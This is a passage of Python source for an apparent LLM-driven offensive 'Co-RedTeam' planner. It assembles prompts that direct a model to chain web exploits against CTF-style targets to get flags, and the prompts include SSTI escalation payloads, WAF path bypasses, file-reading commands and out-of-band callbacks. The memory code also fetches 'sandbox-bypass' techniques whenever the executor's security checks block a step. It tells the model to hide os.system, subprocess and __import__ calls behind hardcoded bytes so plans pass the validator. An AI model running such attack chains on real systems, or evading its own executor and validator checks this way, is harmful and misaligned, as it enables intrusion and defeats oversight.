                if full not in endpoints:
                    endpoints.append(full)

    endpoints.sort()

    vuln_table = _build_vuln_table(vulns)
    evidence_extracts = _build_evidence_extracts(vulns)
    template_selection = _select_cwe_templates(vulns, confirmed, state=state)
    cwe_templates = template_selection.text
    os_context = _get_os_context()

    bp_info = ""
    if prefixes:
        bp_lines = [f"  {name} -> 前缀 {prefix}" for name, prefix in sorted(prefixes.items())]
        bp_info = "\n【已发现的 Blueprint 前缀映射】：\n" + "\n".join(bp_lines) + "\n  所有端点都已自动加上对应前缀，请直接使用完整URL。\n"

    if not endpoints:
        endpoints_str = "  （从evidence/attack_chain中提取；如果没有则根据代码片段合理推断）"
    else:
        endpoints_str = "\n".join(f"  {ep}" for ep in endpoints)

    if endpoints:
        endpoints_str += "\n\n【URL构造规则】：以上端点已经包含完整的 Blueprint 前缀（如 /challenge/api/register）。获取完整URL时直接拼接: {base_url}{endpoint}。"

    challenge_rules = ""
    if adapter is not None:
        challenge_rules = adapter.extra_rules()

    # ── 核心攻击逻辑（前置，让 LLM 第一眼看到最关键的信息）──────
    core_logic = f"""你是 Co-RedTeam 规划智能体。设计能拿到 flag 的完整攻击链。

目标: {target_base} ({target_name}) — {protocol_hint}
蓝图层: {bp_info if bp_info else '无'}
端点: {endpoints_str}

═══════════════ ★ 漏洞核心证据与攻击链（← 从这里开始！） ═══════════════
你必须基于以下 Stage 1 审计结果制定计划。如果漏洞有 CVE 编号，严格按对应 PoC 逻辑编写 exploit 代码。
{evidence_extracts}

══════════════ 漏洞概览 ═══════════════
{vuln_table}"""

# ── CWE 模板 + 规则放后面，作为参考而非主读材料 ──
    if cwe_templates:
        core_logic += f"\n\n【CWE 专项模板参考】\n{cwe_templates}"

    core_logic += f"""

【攻击链设计要求】
1. 根据漏洞依赖关系设计从入口到 flag 的完整路径
2. 第一步必须以探测/验证开头，最后一步必须尝试获取 flag
3. 步骤间数据通过 ContextStore/save_context/output_result 传递
4. 遇到 HAProxy/WAF 路径规则绕过，使用 raw_request() 原样发送 #/%00/..;/ 字符
5. Blind RCE 时立即切换 OOBReceiver 带外反连

【JSON 格式要求】
顶层字段: version(1), plan_id(str), vuln_summary(str), rationale(str), chain_design(str), steps(list), history_state(对象), primitive_context(对象)
每个 step: id(int), status("PLANNED"), type("python"|"shell"), command(str: 完整多行脚本), purpose(str), expected_outcome(str), depends_on(str|null), on_failure("BLOCK_AND_DEBUG"|"SKIP"), why_this_step_advances_state(str), why_this_payload_is_a_mutation(str), why_this_is_not_regression(str), target_primitive(str), why_this_primitive_advances_chain(str)
【exploit reasoning 字段 — 每个 step 必须填写以下字段，否则计划会被 Validator 拒绝】：
  - why_this_step_advances_state: 解释此步骤如何推动 exploit 状态从当前状态向前推进（不是维持现状）
  - why_this_payload_is_a_mutation: 解释此 payload 与历史 payload 的关系（基于什么历史 payload 做的变异、为什么选择这个变异方向）
  - why_this_is_not_regression: 证明此步骤不会导致状态退化或重复已证伪的路径
  - target_primitive: 此步骤的目标 exploit primitive（如 ssti_reflection / sql_union / command_execution）。不能为空！你必须从 Primitive Taxonomy 中选定一个。
  - why_this_primitive_advances_chain: 解释为什么此 primitive 会推进 exploit chain。必须引用具体的 primitive transition graph 边。
primitive_context: {{"current_primitive": "当前处于哪个primitive", "target_primitive": "本轮目标primitive", "transition_edge": "current->target transition条件", "fallback_primitive": "如果升级失败回退到哪个primitive"}}
history_state: {{"tried_payloads":[...], "failed_reasons":[...], "consecutive_failures_per_category":{{}}, "forced_path_switch":"...""}}

【防死循环】
- 禁止重复 tried_payloads 中的 payload
- 同类漏洞连败 ≥3 次强制切换攻击路径
- rationale 开头说明本轮与前轮的关键区别

	【🔴 VERBATIM COPY — 精确复制规则（最高优先级，违反则攻击必然失败）】
	当 CWE 模板或长期记忆中出现以下任一标记时，你必须逐字符原样复制代码，严禁做任何改写：
	  标记 1: "EXACT FORGE FUNCTION (verbatim copy — DO NOT MODIFY)"
	  标记 2: "CRITICAL RULES (violation = exploit fails)"
	  标记 3: "【绝对禁止】"

	严禁的改写行为（这些行为已导致多次任务失败）：
	  ❌ 禁止用 json.dumps(dict) 替代字符串拼接（JSON key 顺序对漏洞利用至关重要）
	  ❌ 禁止在 base64 编码后调用 .rstrip('=')（python_jwt 内部解码器需要完整 padding）
	  ❌ 禁止改变 polyglot 构造中的 key 顺序（必须把伪造 key 放在 JSON 对象的第一个位置）
	  ❌ 禁止用 requests.get() 替代 raw_request() 处理含 # 的路径（requests 库会丢弃 # 后的内容）
	  ❌ 禁止用 f-string 中的 {{header}}.{{payload}}.{{signature}} 替代模板中的固定拼接方式

	正确做法：见到 "verbatim copy" 标记 → 直接复制模板中的完整函数体 → 在 step.command 中调用它

【Step 状态机】
PLANNED→IN_PROGRESS→DONE(exit_code=0)|BLOCKED(exit_code≠0)→追加排错步骤

════════════════════ ★ 攻击状态机（Exploit State Machine）★ ════════════════
【状态推进路径】 init → probe_success → payload_injected → gadget_triggered → oob_received

你必须根据反馈中的 current_exploit_state 和 milestones_achieved 判断当前攻击阶段：
  - init: 还未证实任何攻击面可达 → 本轮以探测/验证端点/获取认证为主
  - probe_success: 已确认端点可达 → 本轮必须在探测 payload 注入点（SSTI/SQLi/命令注入尝试）
  - payload_injected: payload 已被目标接受 → 本轮必须触发 gadget 产生可观测效果
  - gadget_triggered: 漏洞已激活 → 🔴 本轮必须推进到 file_read/flag_exfil。禁止再跑 id/whoami！
    唯一合法操作：执行读文件命令（cat /flag*、type flag.txt 等）并将内容回显到 HTTP 响应。
  - oob_received: 带外数据已到达 → 任务基本完成，收集 flag 并结束

【状态驱动的步骤规划】：
  你的每一步必须服务于状态推进。禁止在 probe_success 阶段反复重试相同探测，
  禁止在 payload_injected 阶段不尝试触发 gadget，
  🔴 禁止在 gadget_triggered 阶段执行 id/whoami/ls —— RCE 已经验证过了，直接读 flag！

══════════════ ★ 单步能力验证铁律（Single-Capability-Per-Round）★ ═══════════════
【🔴 这是硬约束！每轮只能验证 ONE exploit capability，禁止跨级跳跃！】

  FSM 能力阶梯（严格顺序，不可跳过）：
    payload_delivery → reflection → template_eval → breakout →
    object_access → method_call → classloader → exec → file_read → flag_exfil

  ⛔ 核心规则：
  1. 查看上方 L2.5 层的"Exploit Capability State"获知当前已解锁的能力级别
  2. 本轮所有 step 的目标 capability 必须是 🎯 NEXT TARGET 指向的那一级
  3. 如果你看到 template_eval ✅ 但 object_access ⬜：
     → 本轮只能尝试 object_access 的 payload
     → 严禁生成 method_call / exec / file_read / flag_exfil 的 payload
  4. 如果某个 capability 被标记为 🚫 BLOCKED：
     → 该路径已永久关闭，必须寻找绕过方案
     → 例如：method_call BLOCKED → 尝试内建模板指令 #set/#if/#foreach
  5. 每个 step 的 purpose 字段必须包含目标 capability 名称
     → 格式：purpose: "验证 [capability_name]: 具体描述"
     → 例如："验证 object_access: 通过 $class 访问 Java Class 对象"

  ❌ 严禁：
  - 看到 7*7=49 → 直接尝试 Runtime.getRuntime().exec("cat /flag")
  - 一轮中包含跨多个 capability 的 payload
  - 跳过上游未验证的能力直接写 RCE payload

【状态驱动的步骤规划】：

════════════════ ★ 验证驱动攻击（Verification-Driven Exploit）★ ════════════════
【🔴 核心原则：每步攻击必须有验证反馈！严禁 Fire-and-Forget！】

你必须在每个关键攻击步骤后追加验证代码，通过 print() 输出验证结果：
  1. 注入 payload 后 → 必须立即 print HTTP 响应体（至少前 300 字符）
  2. 🔴 注意：如果当前状态已是 gadget_triggered，不要重复执行 id/whoami！直接执行读 flag 命令并回显。
  3. 声称获得文件读取后 → 必须 print 读取到的文件内容片段
  4. 声称触发 SSTI/SQLi 后 → 必须 print 注入结果与预期对比（如 print(f"SSTI result: {{resp.text[:200]}}")）
  5. 使用 OOBReceiver 后 → 必须 print OOB 回调内容（hit.body/hit.path）

【验证步骤模板（必须嵌入到每个攻击 step 的末尾）】：
  print("=" * 40)
  print(f"[VERIFY] step_purpose: {{verification_result}}")
  print(f"[VERIFY] expected: {{expected_behavior}}")
  print(f"[VERIFY] actual: {{actual_response_snippet}}")
  print(f"[VERIFY] status: PASS/FAIL")
  print("=" * 40)

【反 Fire-and-Forget 规则】：
  ❌ 禁止：注入 SSTI payload → 直接 STEP_OK 结束（没有验证是否返回 49）
  ❌ 禁止：执行 curl 命令 → 不检查 stdout 直接继续下一步
  ❌ 禁止：发送 SQL 注入 → 不检查响应中是否有数据库内容
  ✅ 必须：每步 print 关键输出 → 检查 → 根据结果决定下一步 → 再 print 下一步验证

════════════════ ★ 自适应 Payload 变异（Adaptive Payload Evolution）★ ════════════════
【Payload 演化规则 — 严禁随机生成！必须基于历史变异！】

  1. 从成功 payload 变异（沿结构梯度升级）:
     `{{{{ 7 * 7 }}}}` -> `{{{{ config }}}}` -> `{{{{ self.__init__.__globals__ }}}}` -> RCE chain
     保留已确认可达的模板结构，只升级内部执行原语

  2. 从失败 payload 变异（跨格式/编码尝试）:
     失败: `{{{{ 7 * 7 }}}}`
     变异方向: $`{{{{ 7 * 7 }}}}`、#`{{{{ 7 * 7 }}}}`、< % 7*7 % >、%7B%7B7*7%7D%7D
     保留语义，变换语法格式或编码方式

  3. 禁止破坏已确认的结构:
     - 如果双大括号结构已被确认可达，禁止替换为美元大括号结构（除非被 WAF 拦截）
     - 如果单引号OR结构被确认可注入，禁止替换为双引号OR（除非 SQL 报错指示引号不匹配）
     - 每次变异只改变一个维度（格式 / 编码 / 执行原语），不可同时全部改变

  【Payload 变异证明】:
  每个 step 的 why_this_payload_is_a_mutation 字段必须说明：
    - 基于哪个历史 payload 做的变异（引用具体 payload 内容）
    - 保留了什么结构
    - 改变了什么维度
    - 为什么选择这个变异方向

{_COMMON_RULES}
{challenge_rules}
"""

    prompt = core_logic

    return prompt


# ── CWE/类型自动推断（Phase 1 输出 type/cwe_id 通常为 UNKNOWN）──

_CWE_INFERENCE_TABLE: list[tuple[tuple[str, ...], str, str]] = [
    # (keywords, inferred_type, inferred_cwe)
    # 排前面优先级最高，精确匹配先于模糊匹配
    (("crlf", "memcached", "\\r\\n", "%0d%0a"), "crlf_injection", "CWE-93"),
    (("pickle", "deserializ", "unserializ", "__reduce__"), "deserialization", "CWE-502"),
    (("xss", "cross-site scripting", "cross-site-scripting", "stored xss", "reflected xss"), "xss", "CWE-79"),
    (("sqli", "sql injection", "union select", "boolean-based"), "sqli", "CWE-89"),
    (("path traversal", "directory traversal", "../", "..\\", "lfi"), "path_traversal", "CWE-22"),
    (("ssrf", "server-side request forgery"), "ssrf", "CWE-918"),
    (("xxe", "xml external entity"), "xxe", "CWE-611"),
    (("jwt", "jwt alg:none", "jku", "jwk injection"), "jwt_attack", "CWE-347"),
    (("ssti", "jinja2", "freemarker", "thymeleaf", "velocity", "template injection"), "ssti", "CWE-1336"),
    (("command injection", "os.system", "shell_exec", "exec(", "cmd injection"), "command_injection", "CWE-78"),
    # ── cwe_id=UNKNOWN 时的兜底关键词匹配 ──
    (("missing authentication", "no authentication", "unauthenticated"), "missing_auth", "CWE-306"),
    (("missing authorization", "no authorization", "idor"), "missing_authz", "CWE-862"),
    (("hardcoded", "hard-coded", "hardcoded credential"), "hardcoded_credential", "CWE-798"),
    (("information disclosure", "sensitive information", "information exposure"), "info_disclosure", "CWE-200"),
]


def _infer_vuln_classification(vuln: dict[str, Any]) -> str:
    """从 title/source/sink/description 自动推断 CWE 和漏洞类型。

    返回格式: "CWE-502 deserialization"，含 type 和 cwe 两个字段供后续判断复用。
    按关键词命中数选最高分规则；title 字段权重翻倍（标题比描述更准确）。
    """
    text = " ".join(
        str(vuln.get(f, "")) for f in ("source", "sink", "description")
    ).lower()
    title_text = str(vuln.get("title", "")).lower()

    best_score = 0
    best_result = ""
    for keywords, vtype, cwe in _CWE_INFERENCE_TABLE:
        score = 0
        for kw in keywords:
            if kw in title_text:
                score += 2
            elif kw in text:
                score += 1
        if score > best_score:
            best_score = score
            best_result = f"{cwe} {vtype}"
    return best_result


def _build_memory_context(
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None = None,
) -> str:
    """RAG 检索 + 元数据过滤：从 L1(模式) / L2(策略) / L3(技术) 提取相关经验。

    核心改进（v2）：
    1. 先从 confirmed_vuln.json 提取 target_tags（JWT / haproxy / python 等）
    2. 三层检索全部加 where 过滤，只召回 tags_str 匹配的条目
    3. 过滤无结果时自动降级为无过滤检索（由 memory_store 内部实现）
    4. 彻底解决"打 LockTalk 搜出致远 OA 脚本"的问题
    """
    vulns = confirmed.get("vulnerabilities", [])
    cwe_ids: list[str] = [
        v.get("cwe_id", "") for v in vulns if v.get("cwe_id")
    ]
    vuln_titles = " ".join(v.get("title") or "" for v in vulns)[:300]
    vuln_desc = " ".join(
        f"{v.get('source') or ''} {v.get('sink') or ''} {v.get('description') or ''}"
        for v in vulns
    )[:500]

    # ── 提取技术栈标签用于 ChromaDB 元数据过滤 ──
    target_tags = _extract_target_tags(confirmed)

    # ── 从 feedback 提取错误指纹用于精准避坑检索 ──
    error_hints = ""
    if feedback:
        errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        stderr_snippets = " ".join(str(e) for e in errors)[:200]
        fb_text = feedback.get("feedback_for_planner", "")[:300]
        fb_summary = feedback.get("summary", "")[:200]
        error_hints = f"{stderr_snippets} {fb_text} {fb_summary}"

    context_parts: list[str] = []

    # ═══════════════════════════════════════════════════════════════
    # L1 — 漏洞模式（pattern_collection）[元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    pattern_query = f"{' '.join(cwe_ids)} {vuln_titles} 漏洞模式 检测路径"
    pattern_results = memory.query_patterns_filtered(
        pattern_query, filter_tags=target_tags, n_results=3,
    )
    if pattern_results:
        context_parts.append("  【L1·漏洞模式】")
        for i, item in enumerate(pattern_results):
            context_parts.append(f"    ▸ {item.get('content', '')[:300]}")

    # ═══════════════════════════════════════════════════════════════
    # L2 — 利用策略（strategy_collection），成功 + 失败分列 [元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    success_hits: list[str] = []
    failure_hits: list[str] = []

    # CWE-keyed 成功策略
    for cwe in cwe_ids[:3]:
        results = memory.query_strategies_filtered(
            query_text=f"{cwe} {vuln_titles[:100]} 利用 攻击 payload 绕过",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            stype = item.get("metadata", {}).get("strategy_type", "")
            if stype != "failure":
                content = item.get("content", "")[:250]
                if content not in success_hits:
                    success_hits.append(content)

    # 通用成功策略兜底
    if len(success_hits) < 3:
        results = memory.query_strategies_filtered(
            query_text=f"{vuln_desc[:200]} 漏洞利用 成功 攻击步骤",
            filter_tags=target_tags,
            n_results=5,
        )
        for item in results:
            stype = item.get("metadata", {}).get("strategy_type", "")
            if stype != "failure":
                content = item.get("content", "")[:250]
                if content not in success_hits:
                    success_hits.append(content)

    # 失败教训：CWE-keyed + error-keyed
    for cwe in cwe_ids[:3]:
        results = memory.query_strategies_filtered(
            query_text=f"{cwe} 失败 错误 教训 避坑 不要",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            if item.get("metadata", {}).get("strategy_type") == "failure":
                content = item.get("content", "")[:250]
                if content not in failure_hits:
                    failure_hits.append(content)

    if error_hints.strip():
        results = memory.query_strategies_filtered(
            query_text=f"{error_hints[:300]} 失败 错误 修复",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            if item.get("metadata", {}).get("strategy_type") == "failure":
                content = item.get("content", "")[:250]
                if content not in failure_hits:
                    failure_hits.append(content)

    if success_hits:
        context_parts.append("  【L2·成功策略】")
        for i, s in enumerate(success_hits[:5]):
            context_parts.append(f"    ✅ {s}")
    if failure_hits:
        context_parts.append("  【L2·失败教训（禁止重复！）】")
        for i, fh in enumerate(failure_hits[:5]):
            context_parts.append(f"    ❌ {fh}")

    # ═══════════════════════════════════════════════════════════════
    # L3 — 技术操作（tech_collection）★ 最关键的一层 ★ [元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    #
    # P2 门控：CWE UNKNOWN 且 FSM 处于 init/probe_success 阶段时，
    # 禁止读取 L3 战术 payload，只注入抽象的 L1/L2 strategy/pattern 经验。
    # 理由：没有具体漏洞类型 + 没有观测到任何组件特征 = 不具备 payload 适配条件。
    # ═══════════════════════════════════════════════════════════════
    known_cwe_ids = [c for c in cwe_ids if c and c.upper() != "UNKNOWN"]
    cwe_is_unknown = len(known_cwe_ids) == 0

    fsm_state = ""
    if feedback:
        fsm_state = (feedback.get("current_exploit_state", "") or "").strip().lower()
    # 无 feedback = 首轮执行，等同于 init
    fsm_is_early = (not fsm_state) or (fsm_state in ("init", "probe_success"))

    skip_l3_tech = cwe_is_unknown and fsm_is_early

    tech_items: list[dict[str, Any]] = []

    if skip_l3_tech:
        context_parts.append(
            "  【L3·战术 Payload（已抑制）】当前 CWE 未知且攻击状态为 "
            f"'{fsm_state or 'init'}'，跳过战术 payload 注入。"
            "仅提供 L1/L2 的抽象策略经验，待探测到具体组件特征后再启用 L3。"
        )
    else:
        for cwe in cwe_ids[:3]:
            results = memory.query_tech_payloads_filtered(
                query_text=f"{cwe} payload 攻击 利用 命令 脚本",
                filter_tags=target_tags,
                n_results=4,
            )
            for item in results:
                if item.get("content", "") not in [t.get("content", "") for t in tech_items]:
                    tech_items.append(item)

        # 通用 payload 兜底
        if len(tech_items) < 4:
            results = memory.query_tech_payloads_filtered(
                query_text=f"{vuln_desc[:300]} {vuln_titles[:150]} payload 注入 攻击",
                filter_tags=target_tags,
                n_results=4,
            )
            for item in results:
                if item.get("content", "") not in [t.get("content", "") for t in tech_items]:
                    tech_items.append(item)

    # 🔑 Executor 运行时拦截感知检索：从 feedback/error_hints 提取 PYTHON_BLOCKED 模式关键词
    # （sandbox-bypass 检索不受 CWE 门控限制 — 只要 Executor 报出拦截，就应该检索绕过技术）
    if not skip_l3_tech:
        security_patterns_in_feedback: list[str] = []
        if error_hints.strip():
            import re as _re
            _blocked_matches = _re.findall(r'os_system_exec|dynamic_import|PYTHON_BLOCKED|SECURITY_BLOCKED|__import__|os\.system|os\.popen|subprocess\.run', error_hints)
            security_patterns_in_feedback = list(set(_blocked_matches))
        if security_patterns_in_feedback:
            sandbox_query = f"沙箱绕过 sandbox-bypass {' '.join(security_patterns_in_feedback)} 规避 白名单 payload"
            sandbox_results = memory.query_tech_payloads(
                query_text=sandbox_query,
                n_results=4,
            )
            for item in sandbox_results:
                if item.get("content", "") not in [t.get("content", "") for t in tech_items]:
                    tech_items.append(item)
                    item["_sandbox_bypass"] = True

    if tech_items:
        context_parts.append("  【L3·特种 Payload / 脚本（可直接复用！）】")
        payload_seen: set[str] = set()
        for i, item in enumerate(tech_items[:8]):
            payload = item.get("payload") or ""
            cmd = item.get("command") or ""
            script = item.get("script") or ""
            meta = item.get("metadata", {})
            name = meta.get("name", "") or meta.get("context", "") or ""
            source = meta.get("source", "")
            source_tag = f" [来源:{source}]" if source else ""
            is_sandbox = "⚠️ SANDOBOX-BYPASS" if item.get("_sandbox_bypass") else ""

            if payload and payload not in payload_seen:
                payload_seen.add(payload)
                context_parts.append(f"    📦 {is_sandbox} Payload({name}){source_tag}: {payload[:250]}")
            elif cmd and cmd not in payload_seen:
                payload_seen.add(cmd)
                context_parts.append(f"    💻 {is_sandbox} 命令{source_tag}: {cmd[:200]}")
            elif script and script not in payload_seen:
                payload_seen.add(script)
                context_parts.append(f"    📜 {is_sandbox} 脚本({name}):\n{script[:350]}")
            else:
                context_parts.append(f"    ▸ {item.get('content', '')[:200]}")

    # ═══════════════════════════════════════════════════════════════
    # 精确匹配强制注入 — 绕过 ChromaDB 语义检索的不确定性
    # ═══════════════════════════════════════════════════════════════
    #
    # Phase 1 静态分析生成的 confirmed_vuln.json 中 type/cwe_id 通常为 UNKNOWN，
    # 但 title/source/sink/description 已包含足够的分类信息。此处做一次自动推断。
    # ═══════════════════════════════════════════════════════════════
    forced_injection = ""
    pickle_block_injected = False

    # 从分类字段 + 自动推断合成 vuln_text
    classified_parts: list[str] = []
    for v in vulns:
        for f in ("type", "cwe_id", "cwe"):
            val = str(v.get(f, "")).strip()
            if val and val.upper() != "UNKNOWN":
                classified_parts.append(val)
        classified_parts.append(_infer_vuln_classification(v))
    vuln_text = " ".join(classified_parts).lower()

    pickle_triggers = ("pickle.", "pickle_", "__reduce__", "Pickler", "Unpickler", "dumps(", "loads(")
    # Only inject pickle-specific rules when real deserialization patterns appear
    # (bare word "pickle" as in "in a pickle" is a figure of speech, not a vuln)
    has_pickle = any(k in vuln_text for k in pickle_triggers)
    if not has_pickle:
        raw_vuln_text = " ".join(
            str(v.get(f, "")) for v in vulns for f in ("title", "source", "sink", "description")
        ).lower()
        has_pickle = any(k in raw_vuln_text for k in pickle_triggers)
    # 🔴 Rejection gate: suppress pickle forced injection when CRLF/pickle/memcached
    # surface has been rejected.  Reads _rejected_hypotheses (structured list injected
    # by Coordinator from HypothesisTracker before Planner runs) instead of
    # _hypothesis_rejected (boolean set only after Evaluator — unreachable when
    # Validator rejected the plan and Executor/Evaluator never ran).
    if has_pickle and feedback:
        _rej_hyp = feedback.get("_rejected_hypotheses")
        if isinstance(_rej_hyp, list) and _rej_hyp:
            _suppress = any(
                any(kw in (h.get("fingerprint", "") or "").lower()
                    for kw in ("crlf", "pickle", "memcached"))
                for h in _rej_hyp
            )
            if _suppress:
                print("[planner] pickle forced injection suppressed by rejected_hypotheses")
                has_pickle = False
    if has_pickle:
        tech_json_path = memory.memory_dir / "memory" / "tech.json"
        if tech_json_path.exists():
            try:
                with open(tech_json_path, encoding="utf-8") as _f:
                    tech_data = json.load(_f)
                payloads = tech_data.get("payload_templates") or []
                matched: list[str] = []
                for pt in payloads:
                    tags = [t.lower() for t in (pt.get("tags") or [])]
                    if any("pickle" in t or "sandbox-bypass" in t for t in tags):
                        tpl = pt.get("template") or pt.get("payload_template") or ""
                        name = pt.get("name", "")
                        if tpl and tpl not in matched:
                            matched.append(tpl)

                if matched:
                    blocks = []
                    blocks.append("═" * 72)
                    blocks.append("🔴 强制注入：pickle 沙箱安全手法（必须遵守！）")
                    blocks.append("═" * 72)
                    blocks.append("❌ 绝对禁止在代码中写 import pickle / import os / import subprocess")
                    blocks.append("❌ 绝对禁止代码文本出现 os.system( / os.popen( / subprocess.run( / __import__(")
                    blocks.append("✅ 必须使用以下经过验证的 bytes 硬编码手法，直接复制使用：")
                    blocks.append("")
                    for i, tpl in enumerate(matched):
                        blocks.append(f"─── 手法 {i+1} ───")
                        blocks.append(tpl.strip())
                        blocks.append("")
                    blocks.append("═" * 72)
                    forced_injection = "\n".join(blocks)
                    pickle_block_injected = True
            except Exception:
                pass

    if pickle_block_injected:
        print("[planner] 🔴 pickle 精确匹配手法已强制注入 prompt 开头")

    # ── 组装最终记忆块 ──
    body = "\n".join(context_parts) if context_parts else ""
    # 硬截断：memory_block 是增量注入到 system prompt 的，不是核心攻击逻辑，
    # 一旦超过 5000 字符就说明 tag-filter 大面积 fallback 导致噪音涌入，必须物理截断。
    _MAX_MEM_BODY = 5000
    if len(body) > _MAX_MEM_BODY:
        body = body[:_MAX_MEM_BODY // 3] + f"\n...[TRUNCATED memory body {len(body)} → {_MAX_MEM_BODY} chars]...\n" + body[-_MAX_MEM_BODY * 2 // 3:]
        print(f"[planner] ⚠️ memory_body 超限 ({len(body)} > {_MAX_MEM_BODY})，已硬截断")

    filter_note = ""
    if target_tags:
        filter_note = f"\n🔍 元数据过滤已启用 | target_tags: {', '.join(target_tags[:10])}"

    memory_block = f"""╔══════════════════════════════════════════════════════════════╗
║  🧠 长期记忆 — 历史参考（L1/L2/L3 ChromaDB 向量检索）      ║
╚══════════════════════════════════════════════════════════════╝
【💡 以下历史经验仅供参考。请结合当前靶机的实际观测结果自行判断适用性。】{filter_note}

{body}

────────────────────────────────────────────────────────────
【使用说明】：
- L3 中的 Payload 和脚本来自相似技术栈的历史靶机，可能相关但不保证适用
- 必须在当前靶机的 raw_stdout 中观测到相同的组件特征后，方可考虑改编使用
- Memory 是 Advisor，不是 Commander — 当观测与记忆冲突时，以观测为准
- 如果某个 Payload 与当前目标的响应完全不匹配，优先根据 raw_stdout 实际回显自行构建
────────────────────────────────────────────────────────────"""

    if forced_injection:
        return forced_injection + "\n\n" + memory_block
    if not context_parts:
        return ""
    return memory_block


def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, Any]:
    vid = confirmed.get("vuln_id", "unknown")
    title = confirmed.get("title", "未命名漏洞")
    plan_id = f"mock-{vid}-1"

    os_info = platform.system()
    steps = [
        {
            "id": 1,
            "type": "shell",
            "command": f"echo Environment check on {os_info}",
            "purpose": f"环境自检({os_info})",
        },
        {
            "id": 2,
            "type": "shell",
            "command": f"echo Target: {title}",
            "purpose": "对齐漏洞上下文",
        },
    ]

    mem_stats = memory.get_stats()
    mem_context = _build_memory_context(memory, confirmed)
    steps.append(
        {
            "id": 3,
            "type": "python",
            "command": f'python -c "print(\'[mock] layered memory stats: {mem_stats}\')"',
            "purpose": "展示已加载长期记忆规模（演示）",
        }
    )

    return {
        "version": 1,
        "plan_id": plan_id,
        "vuln_summary": title,
        "rationale": "MOCK：未调用大模型。配置 DEEPSEEK_API_KEY 并关闭 CO_REDTEAM_MOCK_LLM 以生成真实计划。",
        "steps": steps,
        "raw_memory_chars": len(mem_context),
        "memory_stats": mem_stats,
        "platform": os_info,
    }


def _build_forbidden_techniques_block(feedback: dict[str, Any]) -> str:
    """从上一轮 feedback 中提取"绝对禁止重用"的技术列表。

    来源 1：Evaluator 的 memory_patch.strategy.add_failures（历史证伪的技术）
    来源 2：Validator 的 rejection errors（本轮的 AST/策略拒绝记录）
    返回一个高可见度的禁止块，直接拼入 system prompt。
    """
    memory_patch = feedback.get("memory_patch", {})
    strategy_patch = memory_patch.get("strategy", {})
    failures = list(strategy_patch.get("add_failures", []))

    # 来源 2：Validator 拒绝记录 → 转化为禁止项
    validator_errors = feedback.get("errors", []) if feedback.get("from") == "validator" else []
    for err_text in validator_errors:
        err_str = str(err_text)
        # 提取被拒绝的模式名（从 remediation 文本中解析）
        if "os.system" in err_str or "禁止代码文本出现 os.system(" in err_str:
            failures.append({"step_id": "?", "error": "validator_rejected_os_system", "root_cause": err_str[:200]})
        elif "subprocess" in err_str:
            failures.append({"step_id": "?", "error": "validator_rejected_subprocess", "root_cause": err_str[:200]})
        elif "__import__" in err_str:
            failures.append({"step_id": "?", "error": "validator_rejected_dynamic_import", "root_cause": err_str[:200]})
        else:
            failures.append({"step_id": "?", "error": "validator_rejected", "root_cause": err_str[:200]})

    if not failures:
        return ""

    lines: list[str] = []
    lines.append("╔══════════════════════════════════════════════════════════════╗")
    lines.append("║  🔴 失败指纹黑名单 — 绝对禁止重用以下已证伪的技术！      ║")
    lines.append("╚══════════════════════════════════════════════════════════════╝")
    lines.append("")
    lines.append("以下技术在上轮执行中已被证伪。你在本轮【绝对禁止】以任何形式复现：")
    lines.append("")

    for i, f in enumerate(failures, 1):
        step_id = f.get("step_id", "?")
        error = f.get("error", "未知错误")
        root_cause = f.get("root_cause", "")
        lines.append(f"  🚫 禁止项 #{i}（上轮 step {step_id} — {error}）")
        if root_cause:
            lines.append(f"     根因: {root_cause}")
        payload_text = f.get("payload", "")
        if payload_text:
            lines.append(f"     已证伪载荷: {payload_text[:200]}")

    lines.append("")
    lines.append("【强制反省要求】：")
    lines.append("  1. 在 rationale 中逐项列出上述禁止项，并说明本轮如何避免")
    lines.append("  2. 如果你在本轮生成了包含上述载荷的 step，你的计划将被直接拒绝")
    lines.append("  3. 如果某个禁止项是本轮成功的关键，你必须设计全新的替代方案")
    lines.append("  4. 若前序步骤（如获取 token）本身未完成，严禁构造依赖它的后续步骤")
    lines.append("")

    # Also extract bypass-level failures from patterns
    pattern_patch = memory_patch.get("pattern", {})
    failed_patterns = pattern_patch.get("add_patterns", [])
    if failed_patterns:
        lines.append("【已证伪的 bypass 模式】:")
        for fp in failed_patterns:
            fp_id = fp.get("id", "?")
            fp_type = fp.get("type", "?")
            fp_payload = fp.get("payload", "")
            fp_desc = fp.get("description", "")
            lines.append(f"  ❌ [{fp_type}] {fp_desc}: {fp_payload}")

    lines.append("")
    lines.append("╚══════════════════════════════════════════════════════════════╝")

    return "\n".join(lines)


def _build_trajectory_context(traj: ExploitTrajectoryMemory) -> str:
    """Dehydrated trajectory state — compact ~400 char high-density dict (Task 3)."""
    if not traj.nodes:
        return ""

    ds = traj.get_dehydrated_state()
    chain = traj.get_current_chain()
    current_state = traj.get_current_state()
    current_primitive = traj.get_current_primitive()

    # Build as compact JSON block (no verbose ASCII art)
    compact = {
        "rounds": len(traj.nodes),
        "state": current_state,
        "chain": chain[-4:],
        "primitive": current_primitive or "",
        "attempted_endpoints": ds["attempted_endpoints"],
        "working_primitives": ds["working_primitives"],
        "blocked_patterns": ds["blocked_patterns"],
        "network_reachable": ds["network_reachable"],
    }
    return json.dumps(compact, ensure_ascii=False, separators=(",", ":"))


def _build_primitive_context(confirmed: dict[str, Any]) -> str:
    """构建 primitive-driven reasoning 上下文注入块。
    这是系统的核心升级：Planner 不再思考 payload，而是思考 primitive。"""
    registry = get_primitive_registry()
    learning = get_learning_engine()
    graph = get_transition_graph()
    traj = get_trajectory()

    cwe_ids = [v.get("cwe_id", "") for v in confirmed.get("vulnerabilities", []) if v.get("cwe_id")]

    lines: list[str] = []
    lines.append("╔══════════════════════════════════════════════════════════════╗")
    lines.append("║  🧬 PRIMITIVE-DRIVEN REASONING — 攻击原语认知推理层        ║")
    lines.append("╚══════════════════════════════════════════════════════════════╝")
    lines.append("")
    lines.append("【⚡ 核心范式转换 — 你必须遵循！】")
    lines.append("")
    lines.append("  旧范式（禁止）：payload A 失败 → payload B → payload C（随机漫游）")
    lines.append("  新范式（必须）：")
